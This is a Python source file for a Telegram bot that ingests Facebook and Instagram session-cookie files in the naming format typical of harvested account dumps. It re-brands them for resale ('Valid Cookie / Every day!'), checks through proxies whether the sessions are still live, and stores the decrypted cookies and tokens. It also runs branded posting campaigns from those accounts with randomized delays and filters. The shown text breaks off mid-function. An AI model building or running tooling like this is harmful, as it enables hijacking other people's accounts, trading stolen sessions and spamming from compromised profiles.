"""Telegram bot handlers for Social Markhors Bot.

Admin commands: /start, /help, /status, /diag, /proxy, /netcheck, /rework,
/verify, /live, /camp, /stopcamp, /db, /db stats, /db export, /db reverify
"""

import asyncio
import csv
import io
import json
import logging
import os
import random
import re
import shutil
import tempfile
import time
import zipfile as _zipfile
from typing import Any, Dict, List, Optional

import httpx

from telegram import Update
from telegram.ext import ContextTypes

from config.settings import (
    ACC_TIMEOUT,
    ADMIN_IDS,
    BOT_VERSION,
    BRAND,
    CONCURRENCY,
    CREDIT,
    DEFAULT_TAG,
    FACEBOOK_URL,
    MAX_FILES,
    POST_BRANDING,
    STATE_DIR,
    SUPABASE_URL,
    TELEGRAM_URL,
    TWITTER_URL,
    VERIFY_CONFIRM_DEAD,
    WEBSITE,
    WHATSAPP_URL,
    ZIP_MAX_FILE,
    ZIP_MAX_TOTAL,
)
from src.database.supabase import SupabaseDB
from src.platforms.base import BasePlatform
from src.platforms.facebook import FacebookPlatform
from src.platforms.instagram import InstagramPlatform
from src.utils.crypto import decrypt_cookies, encrypt_cookies
from src.utils.proxy import (
    add_proxy,
    get_active_proxies,
    load_proxies,
    mask_proxy,
    mask_sensitive,
    norm_proxy,
    proxy_status_text,
    set_proxy_enabled,
    test_proxies,
)
from src.utils.audit import audit_log

logger = logging.getLogger(__name__)


# ============================ GLOBAL STATE ============================

# Cookie file field definitions (netscape format)
FIELDS = ["Status", "Username", "ID", "Followers", "Friends", "Posts", "Likes", "Media",
          "Verified", "Verified type", "Suspended", "Protected", "Country", "Year", "Created",
          "Email", "Phone", "2FA", "Card added", "API", "Developer API"]

# Cookie field names that should be marked HttpOnly
HTTPONLY_NAMES = {
    # X/Twitter
    "auth_token", "ct0", "kdt", "twid", "guest_id",
    "guest_id_marketing", "guest_id_ads",
    # Facebook
    "c_user", "xs", "datr", "sb", "fr", "presence", "locale",
    # Instagram
    "sessionid", "ds_user_id", "csrftoken", "mid", "ig_did", "rur",
}


def _cookie_line(ck: str) -> str:
    """Build a Netscape-format cookie line."""
    line = ck.rstrip("\r")
    if line.startswith("#HttpOnly_"):
        return line
    try:
        if line.split("\t")[5] in HTTPONLY_NAMES:
            return "#HttpOnly_" + line
    except Exception:
        pass
    return line


def _norm_meta(data: Dict[str, Any]) -> Dict[str, str]:
    """Metadata keys ko standard field names me normalize karo."""
    aliases = {
        "username": "Username",
        "fb_id": "ID",
        "ig_id": "ID",
        "country": "Country",
        "followers": "Followers",
        "friends": "Friends",
        "posts": "Posts",
        "verified": "Verified",
        "status": "Status",
        "via": "Via",
        "reason": "Reason",
        "name": "Username",
    }
    out: Dict[str, str] = {}
    for k, v in (data or {}).items():
        if v is None or v == "":
            continue
        key = aliases.get(str(k).lower(), str(k))
        if key == "ID" and not v:
            continue
        out[key] = str(v)
    return out


def branding_lines() -> List[str]:
    """Branding links jo har reworked cookie file ke header me jate hain."""
    return [
        f"\u2013 WhatsApp: {WHATSAPP_URL}",
        f"\u2013 Telegram: {TELEGRAM_URL}",
        f"\u2013 Twitter: {TWITTER_URL}",
        f"\u2013 Facebook: {FACEBOOK_URL}",
    ]


def post_signature(tag: str = "") -> str:
    """Campaign post ke end me branding block (links + hashtag)."""
    lines = [tag] if tag else []
    lines.append(f"Website: {WEBSITE}")
    lines.append(f"WhatsApp: {WHATSAPP_URL}")
    lines.append(f"Telegram: {TELEGRAM_URL}")
    lines.append(f"Twitter: {TWITTER_URL}")
    lines.append(f"Facebook: {FACEBOOK_URL}")
    return "\n".join(lines)


def compose_post_text(variant: str, tag: str = "", branding: bool = True) -> str:
    """Variant + branding footer. Footer kabhi truncate nahi hota."""
    body = variant or ""
    if not branding:
        return safe_text(body, 4096)
    footer = post_signature(tag or DEFAULT_TAG)
    body_max = max(1, 4096 - len(footer) - 2)
    return safe_text(body, body_max).rstrip() + "\n\n" + footer


def build_cookie_file(data: Dict[str, Any], cookies: List[str]) -> str:
    """Build a cookie file string from metadata and cookies."""
    meta = _norm_meta(data)
    out = ["Valid Cookie  /  Every day!", WEBSITE, CREDIT]
    out.extend(branding_lines())
    out.append("")
    for f in FIELDS:
        v = meta.pop(f, None)
        out.append("\u2013 " + f + ": " + (v if v not in (None, "") else "\u2013"))
    for k in sorted(meta):
        out.append("\u2013 " + k + ": " + meta[k])
    out.append("\u2013 Cookies: " + CREDIT)
    out.append("")
    out.extend(_cookie_line(c) for c in (cookies or []))
    return "\n".join(out).rstrip() + "\n"


_META_RE = re.compile(r"^[\u2013\u2014\-]\s*([^:]{1,40}):\s*(.*)$")


def parse_meta(raw: str, filename: str = "") -> Dict[str, str]:
    """Input file header + filename se metadata nikalo (rework ke liye)."""
    meta: Dict[str, str] = {}

    # 1) Header lines: "– ID: 123", "– Name: x", etc.
    for line in (raw or "").splitlines()[:40]:
        if "\t" in line:  # cookie line shuru ho gayi
            break
        m = _META_RE.match(line.strip())
        if not m:
            continue
        k, v = m.group(1).strip(), m.group(2).strip()
        if not v or k.lower() == "cookies":
            continue
        key = "Username" if k.lower() in ("name", "username") else k
        meta[key] = v

    # 2) Filename brackets se missing values fill karo
    name = filename or ""
    patterns = [
        (r"\[(\d+)\s+friends\]", "Friends"),
        (r"\[(\d+)\s+followers\]", "Followers"),
        (r"\[(\d+)\s+posts\]", "Posts"),
        (r"\[(\d+)\s+likes\]", "Likes"),
        (r"\[business\s+(true|false)\]", "Business"),
        (r"\[marketplace\s+(true|false)\]", "Marketplace"),
        (r"\[verified\s+(true|false)\]", "Verified"),
        (r"\[([A-Z]{2})\]", "Country"),
        (r"\[(\d{6,})\]", "ID"),
    ]
    for pat, key in patterns:
        if key in meta and meta[key]:
            continue
        m = re.search(pat, name, re.I)
        if m:
            meta[key] = m.group(1)

    # 3) Instagram username filename format: [... ] [username].txt
    if "ID" not in meta and "Username" not in meta:
        m = re.search(r"\]\s*\[([^\[\]]{1,40})\]\s*\.txt$", name, re.I)
        if m:
            candidate = m.group(1).strip()
            if candidate and not candidate.isdigit():
                meta["Username"] = candidate.lstrip("@")

    return meta


_GENERIC_USERNAMES = {
    "facebook", "instagram", "meta", "log in", "login", "home", "watch",
    "profile", "account", "unknown",
}


def merge_check_meta(meta: Dict[str, str], check: Dict[str, Any], platform: str) -> None:
    """Live-check result ko metadata me merge karo without clobbering good data.

    Pehle `meta.update(check)` filename se aaya hua username/ID bhi generic
    page title ("Facebook") se overwrite kar deta tha.
    """
    uname = str(check.get("username") or "").strip().lstrip("@")
    if uname and uname.lower() not in _GENERIC_USERNAMES:
        meta["Username"] = uname

    pid = check.get("fb_id") if platform == "facebook" else check.get("ig_id")
    if pid:
        meta["ID"] = str(pid)

    followers = check.get("followers")
    if followers not in (None, ""):
        fnum = _to_int(followers)
        if fnum:
            meta["Followers"] = str(fnum)

    country = str(check.get("country") or "").strip()
    if country:
        meta["Country"] = country

    verified = check.get("verified")
    if verified is not None:
        meta["Verified"] = "true" if str(verified).lower() in ("1", "true", "yes") else "false"


# ============================ GLOBAL STATE ============================

_db: Optional[SupabaseDB] = None
_fb_platform: Optional[FacebookPlatform] = None
_ig_platform: Optional[InstagramPlatform] = None
user_state: Dict[int, dict] = {}
CAMPS: Dict[int, dict] = {}
CAMPRUN: Dict[int, dict] = {}

# User state TTL (minutes) - clean up old state entries
USER_STATE_TTL_MIN = int(os.getenv("USER_STATE_TTL_MIN", "30"))

# Per-user command rate limiting (seconds between commands)
USER_CMD_COOLDOWN = float(os.getenv("USER_CMD_COOLDOWN", "2.0"))


def cleanup_user_state():
    """Remove expired entries from user_state and CAMPS."""
    now = time.time()
    ttl = USER_STATE_TTL_MIN * 60
    expired = [uid for uid, st in user_state.items() if now - st.get("at", now) > ttl]
    for uid in expired:
        user_state.pop(uid, None)

    # Also clean up old campaign configs (not running campaigns). stage_at=0
    # wale naye campaign ko turant expire nahi karna.
    expired_camps = [
        uid for uid, cfg in CAMPS.items()
        if now - (cfg.get("stage_at") or now) > ttl and uid not in CAMPRUN
    ]
    for uid in expired_camps:
        CAMPS.pop(uid, None)

    return len(expired) + len(expired_camps)


def init_db(url: str, key: str) -> Optional[SupabaseDB]:
    global _db
    if url and key:
        _db = SupabaseDB(url, key)
        return _db
    return None


def init_platforms(concurrency: int = 8, timeout: float = 25.0):
    global _fb_platform, _ig_platform
    _fb_platform = FacebookPlatform(concurrency=concurrency, timeout=timeout)
    _ig_platform = InstagramPlatform(concurrency=concurrency, timeout=timeout)


def get_platform(platform_name: str) -> Optional[BasePlatform]:
    if platform_name == "facebook":
        return _fb_platform
    if platform_name == "instagram":
        return _ig_platform
    return None


def _account_from_row(row: Dict[str, Any]) -> Dict[str, Any]:
    """Supabase row -> campaign account dict (cookies decrypted)."""
    cookies = row.get("cookies") or {}
    return {
        "username": str(row.get("username") or row.get("fb_id") or row.get("ig_id") or ""),
        "cookies": decrypt_cookies(cookies) if cookies else {},
        "country": row.get("country") or "",
        "followers": row.get("followers") or 0,
        "verified": row.get("verified"),
        "access_token": row.get("access_token") or "",
        "target_id": row.get("fb_id") or row.get("ig_id") or "",
    }


def new_camp() -> dict:
    return {
        "name": "",
        "platform": "",
        "tag": DEFAULT_TAG,
        "filter": {"countries": [], "years": [], "min_followers": 0},
        "limit": 0,
        "delay": [45, 110],
        "max_parts": 3,
        "cleanup_partial": True,
        "dry_run": False,
        "branding": True,
        "source": "zip",
        "stage": "idle",
        "stage_at": time.time(),
        "media": [],
        "media_url": "",
        "texts": [],
    }


def save_camp(uid: int):
    cfg = CAMPS.get(uid)
    if not cfg:
        return
    try:
        os.makedirs(STATE_DIR, exist_ok=True)
        path = os.path.join(STATE_DIR, f"camp_{uid}.json")
        with open(path + ".tmp", "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=1, ensure_ascii=False)
        os.replace(path + ".tmp", path)
    except Exception:
        logger.exception("save_camp")


def load_camps():
    import os
    if not os.path.isdir(STATE_DIR):
        return
    for fn in os.listdir(STATE_DIR):
        if not (fn.startswith("camp_") and fn.endswith(".json")):
            continue
        try:
            uid = int(fn[5:-5])
            with open(os.path.join(STATE_DIR, fn), encoding="utf-8") as f:
                d = json.load(f)
            base = new_camp()
            base.update(d)
            base["stage"] = "idle"
            CAMPS[uid] = base
        except Exception:
            logging.exception("load_camp %s", fn)


class _nullzip:
    """Context manager for single .txt file (not a real zip)."""
    def __init__(self, path: str):
        self.path = path

    def __enter__(self):
        return self

    def __exit__(self, *args):
        pass

    def namelist(self):
        return [os.path.basename(self.path)]

    def read(self, name: str) -> str:
        with open(self.path, encoding="utf-8", errors="ignore") as f:
            return f.read()


def safe_zip_entry_name(name: str) -> str:
    """Sanitize zip entry name to prevent path traversal (zip slip)."""
    # Only use the basename - strips any directory components
    return os.path.basename(name.replace("\\", "/"))


def _pick_proxy() -> Optional[str]:
    """Currently active proxy list se ek valid proxy choose karo."""
    try:
        proxies = get_active_proxies()
    except Exception:  # noqa: BLE001
        logger.exception("get_active_proxies failed")
        proxies = []
    return random.choice(proxies) if proxies else None


def _is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS


async def _require_admin(update: Update) -> bool:
    """Reply 'Sirf admin' and return False when the sender is not an admin."""
    if _is_admin(update.effective_user.id):
        return True
    if update.message:
        await update.message.reply_text("Sirf admin.")
    return False


def _detect_platform_from_name(name: str) -> Optional[str]:
    """Filename se platform detect karo (word-boundary based).

    Pehle `"ig" in name` tha — jis se `big.txt`, `login.txt`, `night.txt`
    galti se Instagram ban jate the.
    """
    low = (name or "").lower()
    parts = re.split(r"[^a-z0-9]+", low)
    has_ig = "instagram" in parts or "ig" in parts or "insta" in parts
    has_fb = "facebook" in parts or "fb" in parts or "meta" in parts
    if has_ig and has_fb:
        return None
    if has_ig:
        return "instagram"
    if has_fb:
        return "facebook"
    return None


def _cookie_platform_hint(cookies: Dict[str, str]) -> Optional[str]:
    """Cookie keys se platform: 'facebook', 'instagram', 'mixed' ya None."""
    fb = any(cookies.get(k) for k in ("c_user", "xs"))
    ig = any(cookies.get(k) for k in ("sessionid", "ds_user_id"))
    if fb and ig:
        return "mixed"
    if fb:
        return "facebook"
    if ig:
        return "instagram"
    return None


def resolve_platform(
    name: str,
    cookies: Dict[str, str],
    explicit: Optional[str] = None,
) -> tuple:
    """Ek file ka sahi platform decide karo.

    Priority: cookie keys > explicit (campaign) > filename.
    Cookie keys sabse strong evidence hain, is liye galat site ki check nahi hoti.

    Returns (platform_or_None, source, reason).
    """
    hint = _cookie_platform_hint(cookies)
    name_hint = _detect_platform_from_name(name)

    if hint == "mixed":
        return None, "cookie", "file me Facebook aur Instagram dono ke cookies mile (mixed)"
    if hint in ("facebook", "instagram"):
        if explicit in ("facebook", "instagram") and explicit != hint:
            return None, "mismatch", (
                f"cookie {hint} ki hai lekin platform {explicit} set hai"
            )
        return hint, "cookie", ""
    if explicit in ("facebook", "instagram"):
        return explicit, "config", ""
    if name_hint:
        return name_hint, "filename", ""
    return None, "unknown", (
        "FB (c_user/xs) ya IG (sessionid/ds_user_id) cookie keys nahi mili"
    )


def _to_int(value: Any, default: int = 0) -> int:
    """'1,234' / '1.2K' / '3M' -> int; invalid -> default."""
    if isinstance(value, bool):
        return int(value)
    s = str(value or "").strip().lower().replace(",", "").replace(" ", "")
    if not s:
        return default
    m = re.match(r"^(-?\d+(?:\.\d+)?)\s*([kmb])?$", s)
    if m:
        mult = {"k": 1_000, "m": 1_000_000, "b": 1_000_000_000}.get(
            m.group(2) or "", 1
        )
        try:
            return int(float(m.group(1)) * mult)
        except (TypeError, ValueError):
            return default
    # Fallback: "12abc" -> 12, "+5" -> 5
    cleaned = re.sub(r"[^0-9\-]", "", s)
    try:
        return int(cleaned) if cleaned not in ("", "-") else default
    except (TypeError, ValueError):
        return default


def _split_csv(values: List[str]) -> List[str]:
    """['PK,', 'US'] -> ['PK', 'US'] (spaces/empties strip)."""
    return [
        part.strip()
        for part in ",".join(values).split(",")
        if part.strip()
    ]


def _status_folder(status: str) -> str:
    """Result status ko output folder name me map karo."""
    if status in ("LIVE", "REWORKED"):
        return "working"
    if status == "DEAD":
        return "dead"
    if status.startswith("ERROR") or status == "NOCOOKIES":
        return "errors"
    return "unknown"


class ProgressReporter:
    """Throttled live progress message editor (Telegram edit flood se bachne ke liye)."""

    def __init__(self, message, title: str, total: int, update_every: Optional[float] = None):
        self.msg = message
        self.title = title
        self.total = max(int(total or 0), 1)
        self.update_every = (
            update_every
            if update_every is not None
            else float(os.getenv("PROGRESS_UPDATE_SEC", "3"))
        )
        self.start = time.time()
        self.last = 0.0
        self.last_text = ""

    @staticmethod
    def _fmt(seconds: float) -> str:
        seconds = int(max(seconds, 0))
        h, rem = divmod(seconds, 3600)
        m, s = divmod(rem, 60)
        return f"{h:d}:{m:02d}:{s:02d}" if h else f"{m:02d}:{s:02d}"

    async def update(
        self,
        processed: int,
        counts: Dict[str, int],
        current: str = "",
        last: str = "",
        force: bool = False,
    ) -> None:
        now = time.time()
        if not force and (now - self.last) < self.update_every:
            return
        self.last = now

        elapsed = now - self.start
        rate = processed / elapsed if elapsed > 0 else 0.0
        eta = (self.total - processed) / rate if rate > 0 else 0.0
        pct = min(processed * 100.0 / self.total, 100.0)
        filled = int(pct / 5)
        bar = "\u2588" * filled + "\u2591" * (20 - filled)

        text = (
            f"{self.title}\n"
            f"[{bar}] {processed}/{self.total} ({pct:.0f}%)\n"
            f"\u2705 working: {counts.get('working', 0)}   "
            f"\u274c dead: {counts.get('dead', 0)}\n"
            f"\u2753 unknown: {counts.get('unknown', 0)}   "
            f"\u26a0\ufe0f errors: {counts.get('errors', 0)}\n"
            f"\u23f1 elapsed {self._fmt(elapsed)} | ETA {self._fmt(eta)} | {rate:.1f}/s"
        )
        if current:
            text += f"\n\U0001F4C4 current: {current[:70]}"
        if last:
            text += f"\n\U0001F50E last: {last[:90]}"

        if text == self.last_text:
            return
        self.last_text = text
        try:
            await self.msg.edit_text(text)
        except Exception as e:  # noqa: BLE001
            # "Message is not modified" / flood wait — progress best-effort hai
            logger.debug("progress edit skipped: %s", e)


def safe_text(text: str, max_len: int = 4096) -> str:
    """Sanitize text input - strip dangerous characters and limit length."""
    if not text:
        return ""
    # Remove control characters except newline/tab
    text = re.sub(r"[\x00-\x08\x0b\x0c\x0e-\x1f]", "", text)
    # Limit length (ellipsis bhi limit ke andar rahe)
    if len(text) > max_len:
        if max_len <= 3:
            text = text[:max_len]
        else:
            text = text[: max_len - 3] + "..."
    return text


def check_user_rate_limit(uid: int) -> bool:
    """Check if user is rate limited. Returns True if allowed, False if rate limited."""
    now = time.time()
    last = user_state.get(uid, {}).get("last_cmd", 0)
    if now - last < USER_CMD_COOLDOWN:
        return False
    user_state[uid] = user_state.get(uid, {})
    user_state[uid]["last_cmd"] = now
    return True


# Commands ke baad turant text/zip bhejna normal flow hai; command cooldown
# (default 2s) content ko block nahi karna chahiye.
CONTENT_COOLDOWN = float(os.getenv("CONTENT_COOLDOWN", "0.5"))

# Ek cookie file ka max processing time (verify ke retries + slow retry cover
# karne ke liye). Isse zyada hone par us file ko errors/ me daal kar aage barh
# jate hain, warna ek hang poora zip stall kar deta hai.
FILE_TIMEOUT = float(os.getenv("FILE_TIMEOUT", str(max(ACC_TIMEOUT, 180))))


def check_content_rate_limit(uid: int) -> bool:
    """Flood protection for text/media/zip ingestion (commands se alag)."""
    now = time.time()
    last = user_state.get(uid, {}).get("last_content", 0)
    if now - last < CONTENT_COOLDOWN:
        return False
    user_state[uid] = user_state.get(uid, {})
    user_state[uid]["last_content"] = now
    return True


# ============================ BASIC HANDLERS ============================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not check_user_rate_limit(uid):
        await update.message.reply_text("Rate limit hit. Please wait before sending another command.")
        return
    await update.message.reply_text(
        f"{BRAND} Bot\n\n"
        "Platforms: Facebook, Instagram\n\n"
        "Modes:\n"
        "1) COOKIE REWORK - /rework > cookie .txt/.zip bhejo\n"
        "2) VERIFY - /verify > cookie zip bhejo\n"
        "3) CAMPAIGN - /camp new > /camp platform > /camp text > /camp start\n\n"
        "Admin: /db /proxy /netcheck /camp\n\n"
        "Full commands: /help"
    )


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not check_user_rate_limit(uid):
        await update.message.reply_text("Rate limit hit. Please wait before sending another command.")
        return
    await update.message.reply_text(
        "REWORK: /rework > cookie .txt ya .zip bhejo\n"
        "Supported cookie formats:\n"
        "  Facebook:    [37 friends] [business false] [marketplace false] [] [userid].txt\n"
        "  Instagram:   [7 followers] [2 posts] [verified false] [business false] [username].txt\n"
        "  Netscape:    domain\\tflag\\tpath\\tsecure\\texpiry\\tname\\tvalue\n"
        "  Header:      key=value ya key: value lines\n\n"
        "VERIFY: /verify > cookie zip bhejo (LIVE / DEAD / UNKNOWN)\n"
        "LIVE: /live on|off (rework ke saath live check)\n"
        "CANCEL: /cancel\n\n"
        "CAMPAIGN:\n"
        "  /camp new <name> | /camp platform facebook|instagram\n"
        "  /camp text > variants bhejo | /camp idle\n"
        "  /camp filter country PK,US | /camp filter followers 500\n"
        "  /camp delay 45-110 | /camp limit 50 | /camp dry (test mode)\n"
        "  /camp tag #EvilMarkhors | /camp branding on|off\n"
        "  /camp mediaurl https://... (IG public image) | /camp mediaclear\n"
        "  /camp filter year 2015,2016\n"
        "  /camp source zip|db | /camp preview | /camp start | /camp reset\n"
        "  /stopcamp\n\n"
        "DB: /db stats | /db export fb|ig | /db reverify fb|ig [limit]\n"
        "PROXY: /proxy status | /proxy add host:port:user:pass\n"
        "       /proxy test | /proxy on | /proxy off | /proxy detect host:port\n"
        "NETCHECK: /netcheck\n\n"
        "Admin only: /db /proxy /netcheck /camp /rework /verify /live"
    )


async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not check_user_rate_limit(uid):
        await update.message.reply_text("Rate limit hit. Please wait before sending another command.")
        return
    lines = [
        f"{BRAND} Bot v{BOT_VERSION}",
        f"Credit: {CREDIT}",
        f"Web: {WEBSITE}",
        f"Admin: {uid in ADMIN_IDS}",
    ]
    if uid in ADMIN_IDS:
        lines += [
            f"Facebook: {'ON' if _fb_platform else 'OFF'}",
            f"Instagram: {'ON' if _ig_platform else 'OFF'}",
            f"DB: {'ON' if _db else 'OFF'}",
            f"Proxies: {len(get_active_proxies())} active / "
            f"{len(load_proxies())} configured",
            f"Campaigns: {len(CAMPS)} saved | {len(CAMPRUN)} running",
        ]
    await update.message.reply_text("\n".join(lines))


async def diag_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("Sirf admin.")
        return
    if not check_user_rate_limit(update.effective_user.id):
        await update.message.reply_text("Rate limit hit. Please wait before sending another command.")
        return
    await update.message.reply_text(
        f"diag: system ok\n"
        f"fb_platform: {'ok' if _fb_platform else 'none'}\n"
        f"ig_platform: {'ok' if _ig_platform else 'none'}\n"
        f"db: {'ok' if _db else 'none'}"
    )


async def proxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await _require_admin(update):
        return
    if not check_user_rate_limit(uid):
        await update.message.reply_text("Rate limit hit. Please wait before sending another command.")
        return

    args = context.args or []
    sub = args[0].lower() if args else "status"

    if sub in ("status", "list", ""):
        await update.message.reply_text(proxy_status_text())
        await audit_log(uid, "proxy_status", {})
        return

    if sub == "detect":
        if len(args) < 2:
            await update.message.reply_text("Usage: /proxy detect <host:port[:user:pass]>")
            return
        entry = args[1]
        await update.message.reply_text(f"Detecting proxy type for {mask_proxy(entry)}...")
        await _proxy_detect(update, entry)
        await audit_log(uid, "proxy_detect", {"entry": mask_proxy(entry)})
        return

    if sub == "add":
        if len(args) < 2:
            await update.message.reply_text("Usage: /proxy add <host:port[:user:pass]>")
            return
        ok, result = add_proxy(args[1])
        if ok:
            await update.message.reply_text(
                f"Proxy added: {mask_proxy(result)}\nTotal: {len(get_active_proxies())}"
            )
            await audit_log(uid, "proxy_add", {"proxy": mask_proxy(result)})
        else:
            await update.message.reply_text(f"Proxy add failed: {result}")
        return

    if sub == "test":
        proxies = get_active_proxies()
        if not proxies:
            await update.message.reply_text("Koi proxy configured nahi.")
            return
        await update.message.reply_text(f"Testing {min(len(proxies), 10)} proxies...")
        results = await test_proxies()
        await update.message.reply_text("Proxy test:\n" + "\n".join(results))
        await audit_log(uid, "proxy_test", {"count": len(results)})
        return

    if sub in ("on", "off"):
        set_proxy_enabled(sub == "on")
        await update.message.reply_text(f"Proxy: {sub.upper()}")
        await audit_log(uid, "proxy_toggle", {"enabled": sub == "on"})
        return

    await update.message.reply_text(
        "Usage: /proxy [status|add host:port:user:pass|test|on|off|detect host:port]"
    )


async def _proxy_detect(u, entry: str):
    """Test both SOCKS5 and HTTP protocols against host:port and tell which works."""
    body = re.sub(r"^[a-z0-9]+://", "", entry.strip(), flags=re.I)

    async def probe(proxy_url: Optional[str]):
        if not proxy_url:
            return False
        cl = None
        try:
            cl = httpx.AsyncClient(proxy=proxy_url, timeout=httpx.Timeout(10.0), trust_env=False)
            r = await cl.get("https://api.ipify.org?format=json")
            return r.status_code == 200
        except Exception:  # noqa: BLE001
            return False
        finally:
            if cl is not None:
                await cl.aclose()

    socks_result = await probe(norm_proxy("socks5://" + body))
    http_result = await probe(norm_proxy("http://" + body))

    if socks_result and http_result:
        verdict = "Both SOCKS5 and HTTP work"
    elif socks_result:
        verdict = "SOCKS5 only"
    elif http_result:
        verdict = "HTTP only"
    else:
        verdict = "Neither works"

    await u.message.reply_text(
        f"Proxy detect for {mask_proxy(entry)}:\n"
        f"SOCKS5: {'✓' if socks_result else '✗'}\n"
        f"HTTP:   {'✓' if http_result else '✗'}\n"
        f"Result: {verdict}"
    )


async def run_netcheck() -> str:
    """Check reachability of Facebook, Instagram and Supabase."""
    targets = [
        ("Facebook", "https://www.facebook.com/"),
        ("Instagram", "https://www.instagram.com/"),
    ]
    if SUPABASE_URL:
        targets.append(("Supabase", SUPABASE_URL + "/rest/v1/"))

    lines = ["Netcheck:"]
    async with httpx.AsyncClient(
        follow_redirects=True, timeout=httpx.Timeout(10.0), trust_env=False
    ) as cl:
        for label, url in targets:
            started = time.time()
            try:
                r = await cl.get(url)
                ms = (time.time() - started) * 1000
                ok = r.status_code < 500
                lines.append(
                    f"{'✓' if ok else '✗'} {label}: HTTP {r.status_code} ({ms:.0f}ms)"
                )
            except Exception as e:  # noqa: BLE001
                ms = (time.time() - started) * 1000
                lines.append(f"✗ {label}: {type(e).__name__} ({ms:.0f}ms)")

    proxies = get_active_proxies()
    lines.append(f"Proxy: {len(proxies)} active" if proxies else "Proxy: OFF")
    return "\n".join(lines)


async def netcheck_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await _require_admin(update):
        return
    uid = update.effective_user.id
    if not check_user_rate_limit(uid):
        await update.message.reply_text("Rate limit hit. Please wait before sending another command.")
        return
    try:
        report = await run_netcheck()
    except Exception as e:  # noqa: BLE001
        logger.exception("netcheck")
        report = f"Netcheck failed: {type(e).__name__}: {e}"
    await update.message.reply_text(report)
    await audit_log(uid, "netcheck", {})


async def rework_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await _require_admin(update):
        return
    if not check_user_rate_limit(uid):
        await update.message.reply_text("Rate limit hit. Please wait before sending another command.")
        return
    prev_live = user_state.get(uid, {}).get("live", False)
    user_state[uid] = {"mode": "rework", "platform": None, "live": prev_live, "at": time.time()}
    await update.message.reply_text(
        "Mode = rework. Ab cookie .txt ya .zip bhejo.\n"
        "Supported formats:\n"
        "  Facebook:    [37 friends] [business false] [marketplace false] [] [userid].txt\n"
        "  Instagram:   [7 followers] [2 posts] [verified false] [business false] [username].txt\n"
        "  Netscape / key=value cookie lines bhi chalengi.\n\n"
        "Output: branded zip (working/unknown/errors folders).\n"
        f"Live check: {'ON (rework + verify)' if prev_live else 'OFF (/live on karo)'}"
    )
    await audit_log(uid, "rework_start", {})


async def verify_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await _require_admin(update):
        return
    if not check_user_rate_limit(uid):
        await update.message.reply_text("Rate limit hit. Please wait before sending another command.")
        return
    user_state[uid] = {"mode": "verify", "live": True, "at": time.time()}
    await update.message.reply_text(
        "Mode = verify. Ab cookie zip bhejo.\n"
        "Check: pehle proxy (agar configured hai), phir direct Railway IP.\n"
        "DEAD result proxy se aaye to direct se confirm hota hai "
        "(VERIFY_CONFIRM_DEAD=0 se band).\n"
        "Har route pe sirf UNKNOWN par retry + backoff hota hai.\n"
        "Output folders: working/ dead/ unknown/ errors/\n"
        "DB: LIVE/DEAD/UNKNOWN sab save/update hote hain (last_check + last_ok)."
    )
    await audit_log(uid, "verify_start", {})


async def live_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await _require_admin(update):
        return
    if not check_user_rate_limit(uid):
        await update.message.reply_text("Rate limit hit. Please wait before sending another command.")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /live on|off")
        return
    val = args[0].lower()
    if val in ("on", "1", "yes"):
        user_state[uid] = user_state.get(uid, {})
        user_state[uid]["live"] = True
        user_state[uid]["at"] = time.time()
        await update.message.reply_text("Live = ON")
    elif val in ("off", "0", "no"):
        user_state[uid] = user_state.get(uid, {})
        user_state[uid]["live"] = False
        user_state[uid]["at"] = time.time()
        await update.message.reply_text("Live = OFF")
    else:
        await update.message.reply_text("Usage: /live on|off")


def _table_for(platform: str) -> str:
    return "fb_accounts" if platform.lower() in ("fb", "facebook") else "ig_accounts"


async def _db_export(update: Update, context: ContextTypes.DEFAULT_TYPE, platform: str) -> None:
    table = _table_for(platform)
    async with httpx.AsyncClient(timeout=httpx.Timeout(15.0)) as cl:
        rows = await _db.fetch(cl, table, {}, limit=5000)

    if not rows:
        await update.message.reply_text(f"{table}: koi row nahi.")
        return

    fields = [
        "id", "username", "fb_id", "ig_id", "country", "followers",
        "verified", "status", "fails", "source", "created_at",
        "last_check", "last_ok", "last_post",
    ]
    buf = io.StringIO()
    writer = csv.DictWriter(buf, fieldnames=fields, extrasaction="ignore")
    writer.writeheader()
    for row in rows:
        writer.writerow({k: row.get(k, "") for k in fields})
    data = io.BytesIO(buf.getvalue().encode("utf-8"))

    await context.bot.send_document(
        update.effective_chat.id,
        document=data,
        filename=f"{table}.csv",
        caption=f"{table}: {len(rows)} rows (cookies/access_token excluded)",
    )


async def _db_reverify(update: Update, context: ContextTypes.DEFAULT_TYPE, platform: str, limit: int) -> None:
    table = _table_for(platform)
    platform_obj = get_platform("facebook" if table == "fb_accounts" else "instagram")
    if not platform_obj:
        await update.message.reply_text("Platform init nahi hua.")
        return

    async with httpx.AsyncClient(timeout=httpx.Timeout(15.0)) as cl:
        rows = await _db.fetch(cl, table, {}, limit=min(max(limit, 1), 500))

    if not rows:
        await update.message.reply_text(f"{table}: koi row nahi.")
        return

    msg = await update.message.reply_text(f"DB reverify: {len(rows)} accounts...")
    reporter = ProgressReporter(
        msg,
        f"DB REVERIFY: {table}",
        len(rows),
    )
    counts = {"working": 0, "dead": 0, "unknown": 0, "errors": 0}
    last_note = ""
    done = 0

    for row in rows:
        uname = str(row.get("username") or row.get("fb_id") or row.get("ig_id") or "?")
        try:
            ck = decrypt_cookies(row.get("cookies") or {})
            check = await _verify_cookie(platform_obj, ck, proxy=_pick_proxy())
            status = check.get("Status", "UNKNOWN")
            counts[_status_folder(status)] += 1
            last_note = f"{status} | {uname}"
            async with httpx.AsyncClient(timeout=httpx.Timeout(10.0)) as dcl:
                await _db.patch_status(
                    dcl, table, uname, status.lower(), ok=(status == "LIVE")
                )
